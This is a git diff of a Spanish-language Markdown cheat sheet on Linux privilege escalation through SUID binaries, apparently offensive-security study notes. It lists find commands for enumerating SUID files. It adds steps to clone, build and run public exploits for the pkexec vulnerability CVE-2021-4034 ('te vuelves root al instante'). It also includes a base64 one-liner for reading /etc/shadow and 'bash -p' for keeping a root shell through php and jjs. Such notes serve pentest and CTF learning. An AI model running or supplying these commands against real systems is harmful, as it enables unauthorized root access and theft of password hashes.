@@ -19,24 +19,49 @@ En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
 * Este tipo de comandos afecta a nivel de sistema a todos los usuarios 
 
 ```bash 
+❯ find / -perm -4000 -ls 2>/dev/null         # Ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
+
 ❯ find / -perm -4000 2>/dev/null             # Ver que comandos son SUID, los buscamos desde la raiz 
 ❯ find / -type f -perm -4000 2>/dev/null 
-❯ find / -perm -4000 -ls 2>/dev/null         # Ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
 ❯ find / -perm -u=s -type f 2>/dev/null      # Buscar comandos SUID desde la raiz 
-❯ find \-user <username> 2>/dev/null         # Ver que comandos donde el propiertario es username
+❯ find \-user <username> 2>/dev/null         # Ver comandos donde el propietario es 'username'
 ```
 
-## Binarios 
+# Binarios 
 
 * [Gtfobins](https://gtfobins.github.io/)
 
+## Pkexec 
+* [PoC Python](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)  <-- Mejor opción 
+```bash 
+Forma 1:
+-rwsr-xr-x 1 root root /usr/bin/pkexec
+
+# Ejecutar el script en la máquina víctima 
+❯ python CVE-2021-4034.py     # Te vuelves root al instante 
+```
+
+```bash 
+Forma 2:
+-rwsr-xr-x 1 root root /usr/bin/pkexec
+
+# Clonar el repo
+❯ git clone https://github.com/berdav/CVE-2021-4034
+
+# Ingresar el directorio 
+❯ make                     # Crear un compilado del binario 
+❯ ./cve-2021-4034          # Ejecutar el binario 
+```
+
+## Base64
 ```bash 
 -rwsr-xr-x 1 root root /usr/bin/base64
 
 # Ejecutar el comando si es SUID como el propietario de forma temporal y sin passwd
-❯ base64 /etc/shadow | base64 -d              # Ver el /etc/shadow
+❯ base64 /etc/shadow | base64 -d        # Mirar el /etc/shadow
 ```
 
+## PHP
 ```bash 
 -rwsr-xr-x 1 root root /usr/bin/php8.1 | php7.4
 
@@ -44,6 +69,7 @@ En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
 ❯ bash -p                                     # Obtener la consola bash con privilegios
 ```
 
+## JJS
 ```bash 
 -rwsr-sr-- 1 root user /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs 
 
@@ -51,12 +77,3 @@ En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
 ❯ bash -p       # Obtener la consola bash con privilegios
 ```
 
-```bash 
--rwsr-xr-x 1 root root /usr/bin/pkexec
-
-❯ git clone https://github.com/berdav/CVE-2021-4034    # Clonar el repo para explotar la vulne 
-
-# Ingresar el directorio 
-❯ make                     # Crear un compilado del binario 
-❯ ./cve-2021-4034          # Ejecutar el binario 
-```
